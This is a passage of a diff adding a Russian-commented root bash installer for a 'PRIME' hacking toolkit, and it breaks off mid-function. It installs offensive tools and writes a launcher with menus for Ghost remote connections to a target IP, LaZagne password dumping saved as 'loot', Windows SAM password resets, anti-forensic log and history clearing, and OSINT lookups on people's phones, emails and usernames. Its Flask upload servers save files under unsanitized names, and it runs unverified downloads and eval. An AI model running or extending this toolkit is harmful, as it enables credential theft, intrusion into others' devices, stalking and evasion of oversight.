@@ -1,0 +1,1180 @@
+#!/bin/bash
+
+# --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
+CURRENT_VERSION="33.5"
+UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all2.sh"
+G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
+
+# --- ПРОВЕРКА ПРАВ ---
+if [ "$EUID" -ne 0 ]; then 
+  echo -e "${R}[!] Ошибка: Запустите от имени root${NC}"
+  exit
+fi
+
+
+repair_and_clean() {
+    [ -f /var/lib/dpkg/status ] && sed -i '/Package: php8/,/^$/d' /var/lib/dpkg/status 2>/dev/null
+    sync && echo 3 | tee /proc/sys/vm/drop_caches >/dev/null 2>&1
+    rm -f /root/*.zip /root/*.tmp /root/*.log /root/*.deb 2>/dev/null
+    apt-get clean && rm -rf ~/.cache/pip
+}
+
+safe_pip() {
+    python3 -m pip install --no-cache-dir --break-system-packages "$@" >/dev/null 2>&1
+    repair_and_clean
+}
+
+
+
+
+
+install_clamav_force() {
+    # Проверяем, установлен ли clamav (ищем исполняемый файл clamscan)
+    if ! command -v clamscan >/dev/null 2>&1; then
+        echo -e "${Y}[*] ClamAV не найден. Инъекция ClamAV (Force Install)...${NC}"
+        repair_and_clean
+        apt-get update >/dev/null 2>&1
+        cd /root
+        # Скачиваем пакеты
+        apt-get download clamav clamav-base clamav-freshclam libclamav* >/dev/null 2>&1
+        # Форсированная установка всех скачанных .deb
+        dpkg -i --force-all *.deb >/dev/null 2>&1
+        # Создание необходимых директорий и файлов заглушек
+        mkdir -p /var/lib/clamav
+        touch /var/lib/clamav/main.cvd /var/lib/clamav/daily.cvd
+        # Очистка за собой
+        rm -f *.deb
+    else
+        echo -e "${G}[+] ClamAV уже установлен. Пропускаю...${NC}"
+    fi
+}
+
+install_tool() {
+    local name=$1; local url=$2; local exec_file=$3; local extra_cmd=$4
+    
+    # 1. Проверка на существование
+    if [ -d "$name" ] && [ -f "$name/$exec_file" ]; then 
+        echo -e "${G}[+] $name найден. Пропуск...${NC}"
+        return 0 
+    fi
+
+    echo -e "${Y}[*] Установка $name...${NC}"
+    
+    # 2. Подготовка
+    rm -rf "temp.zip" "$name" # Удаляем старые битые попытки
+    
+    # 3. Скачивание с проверкой кода ответа (200 OK)
+    curl -L -k -f "$url" -o "temp.zip" >/dev/null 2>&1
+    
+    # Проверка: скачался ли файл и является ли он ZIP-архивом
+    if [ -s "temp.zip" ] && file "temp.zip" | grep -q "Zip archive"; then
+        unzip -q "temp.zip" -d "temp_extract"
+        
+        # Ищем любую папку внутри temp_extract
+        local extracted_dir=$(ls -d temp_extract/*/ 2>/dev/null | head -n 1)
+        
+        if [ -n "$extracted_dir" ]; then
+            mv "$extracted_dir" "$name"
+            rm -rf "temp_extract" "temp.zip"
+            
+            # 4. Выполнение доп. команд (сборка/pip)
+            if [ -n "$extra_cmd" ]; then
+                echo -e "${B}[*] Настройка зависимостей для $name...${NC}"
+                (cd "$name" && eval "$extra_cmd" >/dev/null 2>&1)
+            fi
+            
+            # 5. Права доступа
+            if [ -f "$name/$exec_file" ]; then
+                chmod +x "$name/$exec_file"
+                echo -e "${G}[+] $name готов к работе.${NC}"
+            else
+                # Если файл не найден там, где ждали, ищем его по всей папке
+                find "$name" -name "$exec_file" -exec chmod +x {} \;
+                echo -e "${G}[+] $name установлен (path fixed).${NC}"
+            fi
+        fi
+    else
+        echo -e "${R}[!] Ошибка: Сервер GitHub отклонил запрос или файл поврежден.${NC}"
+        rm -f "temp.zip"
+    fi
+    
+    # Твоя функция очистки RAM и кэша
+    repair_and_clean
+}
+
+
+
+# --- СТАРТ ---
+clear
+echo -e "${R}[*] PRIME v$CURRENT_VERSION: ТОТАЛЬНАЯ СБОРКА...${NC}"
+mkdir -p /root/share /root/PRIME_INBOX
+repair_and_clean
+
+apt-get update >/dev/null 2>&1
+apt-get install -y php curl unzip python3-pip python3-flask nmap foremost tshark aircrack-ng chkrootkit whatweb htop bluez tor git >/dev/null 2>&1
+
+install_clamav_force
+
+# Твой расширенный список инструментов
+TOOLS=(
+    
+)
+
+for entry in "${TOOLS[@]}"; do
+    IFS=";" read -r t_name t_url t_exec t_extra <<< "$entry"
+    install_tool "$t_name" "$t_url" "$t_exec" "$t_extra"
+done
+
+# Специальные установки из твоего оригинала
+if [ ! -d "/root/phoneinfoga" ]; then
+    mkdir /root/phoneinfoga && cd /root/phoneinfoga
+    curl -Lk https://github.com/sundowndev/phoneinfoga/releases/download/v2.10.8/phoneinfoga_Linux_armv7.tar.gz | tar xz
+    chmod +x phoneinfoga
+fi
+
+if [ ! -d "/root/infoga" ]; then
+    git clone --depth=1 https://github.com/alpkeskin/mosint.git /root/infoga
+    cd /root/infoga && safe_pip -r requirements.txt
+fi
+
+# --- 1. УНИВЕРСАЛЬНАЯ И БЕЗОПАСНАЯ ФУНКЦИЯ ЗАПИСИ ---
+# Использует printf %s для предотвращения интерпретации символов внутри кода
+smart_cat() {
+    local target_file="$1"
+    local content="$2"
+    local perms="${3:-755}"
+
+    mkdir -p "$(dirname "$target_file")"
+    
+    # Запись байт-в-байт без риска инъекций
+    printf "%s\n" "$content" > "$target_file"
+    
+    chmod "$perms" "$target_file"
+    echo -e "${G}[OK]${NC} Файл создан: $target_file (Права: $perms)"
+}
+
+# --- 2. УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ОБНОВЛЕНИЯ МОДУЛЕЙ ---
+# Проверяет версию внутри файла перед перезаписью
+update_module() {
+    local file_path="$1"
+    local version="$2"
+    local content_func="$3"
+    local module_name="$4"
+
+    if [ ! -f "$file_path" ] || ! grep -q "VERSION = '$version'" "$file_path"; then
+        echo -e "${Y}[!] Обновление модуля $module_name до v$version...${NC}"
+        
+        # Вызов функции генерации контента
+        $content_func "$file_path" "$version"
+        
+        echo -e "${G}[+] Модуль $module_name v$version успешно интегрирован.${NC}"
+    else
+        echo -e "${G}[+] Модуль $module_name v$version уже актуален.${NC}"
+    fi
+}
+
+
+# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
+generate_iban_code() {
+    local target_file="$1"
+    local v_num="$2"
+    local code
+
+    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
+    code=$(cat << 'EOF'
+import sys, re, json
+from urllib.request import urlopen
+
+# VERSION = '{{V_NUM}}'
+
+def get_detailed_data(iban):
+    try:
+        url = f"[https://api.ibanlist.com/v1/validate/](https://api.ibanlist.com/v1/validate/){iban}"
+        with urlopen(url, timeout=5) as response:
+            return json.loads(response.read().decode())
+    except: return None
+
+def validate_structure(iban):
+    """Разбор структуры (специфика FR и общая)"""
+    res = {
+        "Country": iban[:2],
+        "Check": iban[2:4],
+        "BBAN": iban[4:],
+    }
+    if iban.startswith('FR'):
+        res.update({
+            "Bank Code": iban[4:9],
+            "Branch Code": iban[9:14],
+            "Account": iban[14:25],
+            "RIB Key": iban[25:27]
+        })
+    return res
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2: sys.exit(1)
+    
+    # Очистка от пробелов и тире
+    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
+    
+    # Параметры для сверки
+    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else None
+    provided_bic = sys.argv[3].upper() if len(sys.argv) > 3 else None
+
+    print(f"\033[1;34m--- РЕЗУЛЬТАТ ПРОВЕРКИ IBAN ---\033[0m")
+    
+    struct = validate_structure(target)
+    for key, val in struct.items():
+        print(f"\033[96m{key}:\033[0m {val}")
+
+    data = get_detailed_data(target)
+    if data and data.get('valid'):
+        bank_name = data.get('bank_name', 'N/A')
+        bic = data.get('bic', 'N/A')
+        
+        print(f"\n\033[1;32m[+] СТАТУС: ВАЛИДЕН\033[0m")
+        print(f"🏦 Банк: {bank_name}")
+        print(f"🔑 BIC: {bic}")
+        
+        if provided_name or provided_bic:
+            print(f"\n\033[1;35m--- ОТЧЕТ О СВЕРКЕ (MATCH REPORT) ---\033[0m")
+            if provided_bic:
+                if provided_bic in bic:
+                    print(f"✅ BIC Match: ПРОВЕРЕНО ({bic})")
+                else:
+                    print(f"❌ BIC Mismatch! Ожидалось: {provided_bic}, Найдено: {bic}")
+            
+            if bank_name != 'N/A':
+                print(f"ℹ️ Подтверждение: Банк {bank_name} верифицирован")
+    else:
+        print(f"\033[91m[-] ОШИБКА: Неверная структура или контрольная сумма\033[0m")
+EOF
+)
+
+    # Внедряем версию
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+
+    # Используем smart_cat для записи (права 755 по умолчанию)
+    smart_cat "$target_file" "$code"
+}
+
+# --- ВЫЗОВ В СЕКЦИИ DEPLOYMENT ---
+
+
+# --- ГЕНЕРАТОР ЕДИНОГО ДИЗАЙНА ---
+generate_core_template() {
+    echo '
+def render_prime_page(title, content):
+    style = """
+    <style>
+        body { background: #050505; color: #00ff41; font-family: "Courier New", monospace; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .container { border: 1px solid #00ff41; padding: 30px; background: #111; box-shadow: 0 0 20px rgba(0,255,65,0.1); border-radius: 5px; width: 90%; max-width: 900px; text-align: center; }
+        h2 { border-bottom: 1px solid #00ff41; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; margin-top: 0; color: #00ff41; }
+        .btn, button { background: #00ff41; color: #000; border: none; padding: 12px 24px; cursor: pointer; font-weight: bold; text-transform: uppercase; text-decoration: none; display: inline-block; width: 100%; transition: 0.3s; margin-top: 20px; font-family: inherit; }
+        .btn:hover, button:hover { background: #008f25; box-shadow: 0 0 15px #00ff41; }
+        pre { white-space: pre-wrap; font-size: 0.85em; color: #0cf; background: #000; padding: 15px; border: 1px solid #222; text-align: left; max-height: 300px; overflow-y: auto; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 15px; margin-top: 20px; }
+        .file-card { background: #1a1a1a; border: 1px solid #333; padding: 15px; color: #00ff41; text-decoration: none; font-size: 0.8em; word-break: break-all; transition: 0.2s; }
+        .file-card:hover { border-color: #00ff41; background: #00ff4111; }
+        .status-box { padding: 15px; margin-bottom: 15px; font-weight: bold; border: 1px solid; text-transform: uppercase; }
+        .clean { color: #00ff41; border-color: #00ff41; }
+        .infected { color: #ff3e3e; border-color: #ff3e3e; }
+    </style>
+    """
+    full_html = f"""
+    {{style}}
+    <div class="container">
+        <h2>> {{title}}</h2>
+        <div class="content-area">
+            {{content}}
+        </div>
+    </div>
+    """
+    return full_html
+'
+}
+
+generate_core_form_template() {
+    echo '
+def render_prime_form(action_url, fields=None, btn_text="EXECUTE"):
+    """
+    fields: список словарей, например:
+    [{"type": "file", "name": "file", "label": "Select File"},
+     {"type": "text", "name": "user", "placeholder": "Operator ID"}]
+    """
+    if fields is None:
+        fields = [{"type": "file", "name": "file"}] # По умолчанию просто выбор файла
+
+    inputs_html = ""
+    for field in fields:
+        f_type = field.get("type", "text")
+        f_name = field.get("name", "input")
+        f_placeholder = field.get("placeholder", "")
+        f_label = field.get("label", "")
+        
+        inputs_html += f"<div style='margin-bottom: 15px;'>"
+        if f_label:
+            inputs_html += f"<label style='display:block; font-size:0.7em; color:#888;'>{f_label}</label>"
+        
+        if f_type == "select":
+            options = "".join([f"<option value='{o}'>{o}</option>" for o in field.get("options", [])])
+            inputs_html += f"<select name='{f_name}' style='background:#111; color:#00ff41; border:1px solid #333; padding:10px; width:80%; font-family:inherit;'>{options}</select>"
+        else:
+            inputs_html += f"<input type='{f_type}' name='{f_name}' placeholder='{f_placeholder}' required style='background:#111; color:#00ff41; border:1px dashed #333; padding:10px; width:80%; font-family:inherit;'>"
+        
+        inputs_html += "</div>"
+
+    return f"""
+    <form method="post" action="{action_url}" enctype="multipart/form-data" style="margin-top:20px;">
+        {inputs_html}
+        <button type="submit">{btn_text}</button>
+    </form>
+    """
+'
+}
+
+
+# Функция-генератор для AV-Server (v1.2)
+# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
+generate_av_server_code() {
+    local target_file="$1"
+    local v_num="$2"
+    
+    # Загружаем оба шаблона: базовый Layout и конструктор Form
+    local templates="$(generate_core_template)
+$(generate_core_form_template)"
+
+    local code
+
+    code=$(cat << EOF
+from flask import Flask, request, render_template_string
+import subprocess, os, shutil, socket
+
+# VERSION = '{{V_NUM}}'
+app = Flask(__name__)
+
+# Поиск движка ClamAV
+CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'
+
+$templates
+
+@app.route('/')
+def index():
+    # Динамически создаем форму: только выбор файла для сканирования
+    fields = [
+        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
+    ]
+    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
+    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))
+
+@app.route('/scan', methods=['POST'])
+def scan():
+    f = request.files.get('file')
+    if not f: return "No data", 400
+    
+    tmp_path = os.path.join('/tmp', f.filename)
+    f.save(tmp_path)
+    os.sync()
+
+    scan_output = ""
+    try:
+        # Лимит 20МБ и таймаут 300с для старых устройств (Wiko Lenny 3)
+        cmd = [CLAM_PATH, '--no-summary', '--max-filesize=20M', tmp_path]
+        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        scan_output = res.stdout if res.stdout else res.stderr
+        if not scan_output and res.returncode == 0:
+            scan_output = f"{f.filename}: OK"
+    except subprocess.TimeoutExpired:
+        scan_output = "SCAN_ERROR: TIMED OUT (CPU OVERLOAD). PROBABLY FILE TOO LARGE."
+    except Exception as e:
+        scan_output = f"SYSTEM_CRITICAL_ERROR: {str(e)}"
+    finally:
+        if os.path.exists(tmp_path): os.remove(tmp_path)
+
+    is_infected = "FOUND" in scan_output or "Infected" in scan_output
+    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_TRANSMISSION_VERIFIED"
+    status_class = "infected" if is_infected else "clean"
+
+    # Формируем контент результата
+    content = f"""
+    <div class="status-box {status_class}">{status_msg}</div>
+    <pre>{{{{ output }}}}</pre>
+    <a href="/" class="btn">[ RETURN TO GATEWAY ]</a>
+    """
+    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)
+
+if __name__ == '__main__':
+    # Генерация SSL сертификатов для безопасного канала
+    if not os.path.exists('/root/cert.pem'):
+        os.system('openssl req -x509 -newkey rsa:2048 -nodes -out /root/cert.pem -keyout /root/key.pem -days 365 -subj "/CN=scanclamavlocal"')
+    
+    # Очистка порта перед запуском
+    os.system('fuser -k 5000/tcp 2>/dev/null')
+    app.run(host='0.0.0.0', port=5000, ssl_context=('/root/cert.pem', '/root/key.pem'), debug=False)
+EOF
+)
+    # Внедряем версию и записываем файл через твой smart_cat
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+    smart_cat "$target_file" "$code"
+}
+
+
+# Функция-генератор для Share-Server (v1.0)
+# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
+generate_share_server_code() {
+    local target_file="$1"
+    local v_num="$2"
+    
+    # Загружаем только базовый шаблон страницы (формы здесь не нужны)
+    local template=$(generate_core_template)
+    local code
+
+    code=$(cat << EOF
+from flask import Flask, render_template_string, send_from_directory
+import os
+
+# VERSION = '{{V_NUM}}'
+app = Flask(__name__)
+SHARE_DIR = '/root/share'
+
+if not os.path.exists(SHARE_DIR):
+    os.makedirs(SHARE_DIR, exist_ok=True)
+
+$template
+
+@app.route('/')
+def index():
+    try:
+        files = os.listdir(SHARE_DIR)
+    except:
+        files = []
+    
+    # Формируем динамический контент (сетку файлов)
+    grid_content = '<div class="grid">'
+    for f in files:
+        grid_content += f"""
+        <a href="/get/{f}" class="file-card">
+            <div style="font-size: 40px; margin-bottom: 10px;">📄</div>
+            <div style="word-break: break-all;">{f}</div>
+        </a>
+        """
+    
+    if not files:
+        grid_content += '<p style="color: #555; font-style: italic; grid-column: 1/-1;">No files detected in the transmission sector.</p>'
+    
+    grid_content += '</div>'
+    grid_content += f'<p style="color: #444; font-size: 0.7em; margin-top: 20px;">SECTOR_PATH: {SHARE_DIR}</p>'
+
+    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))
+
+@app.route('/get/<filename>')
+def get_file(filename):
+    return send_from_directory(SHARE_DIR, filename)
+
+if __name__ == '__main__':
+    # Очистка порта перед запуском
+    os.system('fuser -k 5002/tcp 2>/dev/null')
+    app.run(host='0.0.0.0', port=5002, debug=False)
+EOF
+)
+    # Внедряем версию и записываем
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+    smart_cat "$target_file" "$code"
+}
+
+# Функция-генератор для Upload-Server (v1.0)
+generate_upload_server_code() {
+    local target_file="$1"
+    local v_num="$2"
+    
+    # Загружаем оба шаблона: Layout и динамический конструктор форм
+    local templates="$(generate_core_template)
+$(generate_core_form_template)"
+    local code
+
+    code=$(cat << EOF
+from flask import Flask, request, render_template_string
+import os
+
+# VERSION = '{{V_NUM}}'
+app = Flask(__name__)
+
+# Автоматическое определение директории (SD-карта или локальное хранилище)
+UPLOAD_DIR = '/sdcard/PRIME_INBOX' if os.path.exists('/sdcard') else '/root/PRIME_INBOX'
+if not os.path.exists(UPLOAD_DIR): 
+    os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+$templates
+
+@app.route('/')
+def index():
+    # Описываем поля для конструктора формы
+    fields = [
+        {"type": "file", "name": "file", "label": "SELECT_TRANSMISSION_DATA"}
+    ]
+    
+    # Генерируем форму и описание
+    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
+    info_html = f'<p style="font-size: 0.8em; margin-bottom: 20px; color: #888;">Secure uplink established.</p>'
+    target_html = f'<div style="color: #444; font-size: 0.7em; margin-top: 20px;">TARGET_DIR: {UPLOAD_DIR}</div>'
+    
+    # Собираем страницу через Layout
+    return render_template_string(render_prime_page("INBOUND_DROP_BOX", info_html + form_html + target_html))
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'file' not in request.files: return "TRANSFER_ERROR: NO_FILE", 400
+    f = request.files['file']
+    if f.filename == '': return "TRANSFER_ERROR: EMPTY_FILENAME", 400
+    
+    f.save(os.path.join(UPLOAD_DIR, f.filename))
+    return "SUCCESS: File received and stored."
+
+if __name__ == '__main__':
+    # Очистка порта перед запуском
+    os.system('fuser -k 5001/tcp 2>/dev/null')
+    app.run(host='0.0.0.0', port=5001, debug=False)
+EOF
+)
+    # Внедряем версию и записываем
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+    smart_cat "$target_file" "$code"
+}
+
+# --- 4. ИСПОЛНЕНИЕ (DEPLOYMENT) ---
+
+echo -e "${B}--- STARTING CORE-PRIME SYNCHRONIZATION ---${NC}"
+
+# --- ГЕНЕРАЦИЯ LAUNCHER (Твой оригинал + расширенный TOOLS_DATA) ---
+generate_launcher_code() {
+    local target_file="$1"
+    local v_num="$2"
+    local code
+
+    # Используем одинарные кавычки 'EOF', чтобы переменные внутри не раскрывались при записи
+    code=$(cat << 'EOF'
+#!/bin/bash
+CURRENT_VERSION="{{V_NUM}}"
+G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
+set +o history
+
+# --- Инициализация системы ---
+if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
+    rm -f /root/.cache/zcompdump* 2>/dev/null
+    rm -f /root/.zcompdump* 2>/dev/null
+fi
+
+CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
+[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"
+
+# Настройка DNS
+if command -v dnsmasq >/dev/null 2>&1; then
+    cat << EOD > /etc/dnsmasq.conf
+domain-needed
+bogus-priv
+interface=lo
+interface=wlan0
+address=/scanclamavlocal/$CURRENT_IP
+EOD
+    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
+fi
+
+# --- Базовые функции ---
+repair() { 
+    sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
+    rm -rf /root/.cache/* /tmp/* 2>/dev/null
+    history -c
+}
+
+zero_clear() {
+    rm -rf /tmp/* /root/.npm/_logs/* > /dev/null 2>&1
+    sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
+}
+
+get_stats() {
+    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
+    local rom=$(df -h / | awk 'NR==2 {print $4}')
+    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}')
+    [ -z "$sd_info" ] && sd_info="N/A"
+    local net="${R}OFFLINE${NC}"; ping -c 1 -W 1 8.8.8.8 >/dev/null 2>&1 && net="${G}ONLINE${NC}"
+    local srv=""; pgrep -f "av_server.py" >/dev/null && srv+=" ${G}[AV]${NC}"; pgrep -f "share_server.py" >/dev/null && srv+=" ${G}[SH]${NC}"; pgrep -f "upload_server.py" >/dev/null && srv+=" ${G}[UP]${NC}"
+    [ -z "$srv" ] && srv="${R}NONE${NC}"
+    echo -e "${Y}RAM: ${G}$ram ${Y}| ROM: ${G}$rom ${Y}| SD: ${G}$sd_info"
+    echo -e "${Y}NET: $net ${Y}| ACTIVE SRV:$srv${NC}"
+}
+
+# --- Универсальный контроллер ---
+prime_dynamic_controller() {
+    local title=$1
+    local -a labels=($2)
+    local -a actions=($3)
+    
+    while true; do
+        clear
+        echo -e "${R}========== [ $title ] ==========${NC}"
+        get_stats
+        echo -e "---------------------------------------"
+        
+        for ((i=0; i<${#labels[@]}; i++)); do
+            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
+            if (( (i+1) % 2 == 0 )); then echo ""; fi
+        done
+        echo -e "\n${Y} B) BACK / EXIT${NC}"
+        echo -e "---------------------------------------"
+        
+        read -p ">> " choice
+        
+        # ГАРАНТИРОВАННЫЙ ВЫХОД
+        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then 
+            return 0 
+        fi
+        
+        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
+            local idx=$((choice-1))
+            ${actions[$idx]}
+        else
+            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"
+            sleep 1
+        fi
+    done
+}
+
+# --- Модули: OSINT ---
+run_smart_osint_engine() {
+    clear
+    echo -e "\e[1;36m"
+    echo "--------------------------------------------------"
+    echo "    PRIME MASTER: SMART OSINT ENGINE 2026         "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    read -p "ENTER DATA (Nick, Phone, or Email): " INPUT
+    [ -z "$INPUT" ] && return
+
+    echo -e "\n\e[1;34m[*] Phase 1: Rapid Presence Check (SocialScan)...\e[0m"
+    socialscan "$INPUT"
+
+    # --- ФАЗА 2: Эвристический анализ типа данных ---
+    if [[ "$INPUT" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$ ]]; then
+        # Это EMAIL
+        echo -e "\e[1;32m[!] Detected Type: EMAIL\e[0m"
+        echo -e "\e[1;34m[*] Running Infoga & Breach Analysis...\e[0m"
+        python3 /root/infoga/infoga.py --target "$INPUT"
+        
+    elif [[ "$INPUT" =~ ^\+?[0-9]{10,15}$ ]]; then
+        # Это ТЕЛЕФОН
+        echo -e "\e[1;32m[!] Detected Type: PHONE\e[0m"
+        echo -e "\e[1;34m[*] Running Phone Lookup Engine...\e[0m"
+        # Здесь можно добавить поиск по базам или специфические утилиты для телефонов
+        echo "Searching for $INPUT across known databases..."
+        
+    else
+        # Это НИКНЕЙМ (Username)
+        echo -e "\e[1;32m[!] Detected Type: USERNAME\e[0m"
+        echo -e "\e[1;34m[*] Starting Deep Auto-Pilot (Maigret + Blackbird)...\e[0m"
+        
+        echo -e "\e[1;33m[>] Running Maigret (Parse Mode)...\e[0m"
+        maigret "$INPUT" --parse --timeout 15 --top 500
+        
+        echo -e "\e[1;33m[>] Running Blackbird (Recursive Search)...\e[0m"
+        python3 /root/blackbird/blackbird.py -u "$INPUT"
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo "OSINT Scan Complete."
+    read -p "Press [ENTER] to return..."
+}
+
+
+# --- Модули: DEVICE & NETWORK (Пункт 5) ---
+run_device_hack() {
+    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
+    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
+    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
+}
+
+run_ghost_commander() {
+    clear
+    echo -e "\e[1;31m"
+    echo "--------------------------------------------------"
+    echo "    PRIME MASTER: GHOST COMMANDER (ANDROID/IOT)   "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Target IP (Leave empty for Manual Console): "
+    read TARGET_IP
+
+    # Проверяем наличие самого фреймворка
+    if [ ! -d "/root/Ghost" ]; then
+        echo -e "\e[1;31m[!] Error: Ghost Framework not found in /root/Ghost\e[0m"
+        read -p "Press [ENTER] to return..."
+        return
+    fi
+
+    if [ -z "$TARGET_IP" ]; then
+        # --- Режим 1: Ручная консоль ---
+        echo -e "\e[1;34m[*] Launching Manual Ghost Console...\e[0m"
+        cd /root/Ghost && python3 -m ghost
+    else
+        # --- Режим 2: AutoPwn / Прямое подключение ---
+        echo -e "\e[1;32m[*] Executing Auto-Connect to: $TARGET_IP\e[0m"
+        # Мы используем --execute, чтобы пробросить команду прямо в движок
+        cd /root/Ghost && python3 -m ghost --execute "connect $TARGET_IP"
+    fi
+
+    echo -e "\n\e[1;33m--------------------------------------------------\e[0m"
+    read -p "Ghost Session Terminated. Press [ENTER]..."
+}
+
+
+analyze_network_traffic() {
+    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
+    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
+    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
+}
+
+run_host_monitor() { tshark -i wlan0 -T fields -e ip.src -e ip.dst; }
+run_http_dns_sniffer() { tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name; }
+run_traffic_record() { mkdir -p /root/reports; tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap; }
+
+# --- Модули: RECOVERY & PASSWORDS ---
+pc_password_recovery() {
+    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
+    local  n_funcs="run_pc_recovery_ultimate smart_threat_scan"
+    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
+}
+
+run_pc_recovery_ultimate() {
+    clear
+    echo -e "\e[1;35m"
+    echo "--------------------------------------------------"
+    echo "    PRIME MASTER: RECOVERY & FORENSIC ENGINE      "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -e "\e[1;34m[1] PASSWORDS EXTRACTION (LaZagne Mode)\e[0m"
+    echo -e "\e[1;34m[2] SMART PASSWORD RESET (Windows/Linux/macOS)\e[0m"
+    echo -e "\e[1;34m[3] EXIT TO MAIN MENU\e[0m"
+    echo "--------------------------------------------------"
+    read -p "SELECT ACTION: " MAIN_CHOICE
+
+    case "$MAIN_CHOICE" in
+        1)
+            # --- Экстракция паролей через LaZagne ---
+            echo -e "\n\e[1;33m[*] Starting LaZagne Engine...\e[0m"
+            if [ -d "/root/lazagne" ]; then
+                python3 /root/lazagne/lazagne.py all -oN /root/prime_extracted_passwords.txt
+                echo -e "\e[1;32m[+] Done! Loot saved to /root/prime_extracted_passwords.txt\e[0m"
+            else
+                echo -e "\e[1;31m[ERR] LaZagne not found in /root/lazagne\e[0m"
+            fi
+            ;;
+
+        2)
+            # --- Единый Умный Сброс Паролей (All-in-One) ---
+            echo -e "\n\e[1;34m[*] Detecting Target OS Environment...\e[0m"
+            
+            # 1. Проверка на Windows SAM (если примонтированы диски)
+            WIN_SAM=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
+            
+            if [ -n "$WIN_SAM" ]; then
+                echo -e "\e[1;32m[+] Windows SAM detected at: $WIN_SAM\e[0m"
+                echo -e "\e[1;33m[!] Launching CHNTPW Interactive Mode...\e[0m"
+                chntpw -i "$WIN_SAM"
+            
+            # 2. Проверка на Linux/macOS через нашу эвристику
+            else
+                OS_TYPE="Unknown"
+                [[ "$OSTYPE" == "linux-gnu"* ]] && OS_TYPE="Linux"
+                [[ "$OSTYPE" == "darwin"* ]] && OS_TYPE="macOS"
+                
+                if [ "$OS_TYPE" == "Linux" ] || [ "$OS_TYPE" == "macOS" ]; then
+                    echo -e "\e[1;32m[+] $OS_TYPE Environment detected.\e[0m"
+                    
+                    # Собираем список юзеров (как в нашей прошлой версии)
+                    declare -a USERS_LIST
+                    if [ "$OS_TYPE" == "Linux" ]; then
+                        mapfile -t USERS_LIST < <(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
+                    else
+                        mapfile -t USERS_LIST < <(dscl . list /Users | grep -v '^_' | grep -v 'root')
+                    fi
+
+                    if [ ${#USERS_LIST[@]} -eq 0 ]; then
+                        echo -e "\e[1;31m[!] No users found.\e[0m"
+                    else
+                        for i in "${!USERS_LIST[@]}"; do echo -e "  [\e[1;32m$i\e[0m] ${USERS_LIST[$i]}"; done
+                        read -p "SELECT USER NUMBER: " U_IDX
